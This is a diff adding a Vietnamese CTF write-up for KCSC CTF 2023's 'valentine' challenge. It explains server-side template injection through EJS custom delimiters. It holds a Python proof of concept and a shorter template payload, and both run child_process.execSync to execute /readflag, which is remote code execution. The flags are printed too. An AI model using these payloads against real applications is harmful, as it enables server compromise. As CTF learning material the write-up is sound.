@@ -91,3 +91,59 @@ Trong giải này team mình làm theo cách 1:
 
 Flag: `KCSC{Bypass_Turnstile_Cloudflare_1e22c0f8}`
 
+# valentine (stolen) 
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/95d4588f-ebcf-4cce-a42d-e8ab20db09e8)
+
+## Description
+Bài này trong giải vừa qua mình đã không giải được do kiến thức về SSTI còn quá gaf, sau khi giải kết thúc được người ae 5h4s1 cùng lớp hint là có một bài write-up khác có thể áp dụng để giải thì mình đã áp dụng  thành công
+
+Link WU: https://hxp.io/blog/101/hxp-CTF-2022-valentine/
+
+Đầu tiên khi vào Challenge BTC cung cấp cho một file chứa toàn bộ Source code và file Docker
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/7b3a9622-c578-4f29-9dbe-7a0eb66570a3)
+
+File flag nằm ở ngoài web root + WU liên quan tới SSTI nên chắc chắn ta sẽ phải RCE để đọc flag (đọc thông qua việc thực thi file readFlag)
+
+Mình custom lại PoC của WU, hiểu nôm na là họ sẽ sử dụng kỹ thuật `SSTI using EJS custom delimiters` 
+
+```
+import requests
+import re
+
+HOST = 'https://valentine.kcsc.tf'
+
+r = requests.post(f"{HOST}/template", data={"tmpl":"""{{ name }} <.= global.process.mainModule.require('child_process').execSync('/readflag') .>"""}, allow_redirects=False)
+
+m = re.search(r"/(?P<uuid>.*)?name=", r.text)
+r = requests.get(f"{HOST}{m.group(0)}&delimiter=.")
+m = re.search(r"KCSC\{[^}]+\}", r.text)
+print(m.group(0))
+```
+EJS custom delimiters sẽ được sử dụng để định nghĩa một delimiter mới, trong bài này sử dụng delimiter mặc định là `%`
+
+* Note: Do trong bài có kiểm tra template gửi lên có chứa `{{name}}` hay không nên ta sẽ phải thêm chuỗi này vào template
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9fb5f140-93b8-4b31-b4fd-62cd3d3940e3)
+
+Chạy PoC ta được Flag:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/fd5e1a20-1085-4967-9fa6-7dbec5b7852a)
+
+### Sau khi một số team public WU thì mình có biết thêm 1 cách dễ hiểu hơn
+
+Do challenge không filter `{{` và `}}` mà chỉ chuyển nó sang dạng `<%=` và `%>`mà 2 dang này vẫn có thể thực thi code bình thường. Do đó ta có thể chèn 2 chuỗi template trong cùng 1 lần gửi lên
+
+`{{ name }} 
+{{ process.mainModule.require('child_process').execSync('/readflag').toString() }}`
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/48742e30-c445-4a74-9725-ebab2359032c)
+
+Kết quả:
+
+![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b6ea3536-8809-4dea-ae51-c6403ad2fc2b)
+
+Flag: `KCSC{https://www.youtube.com/watch?v=A5OLaBlQP9I}`
+
+
+
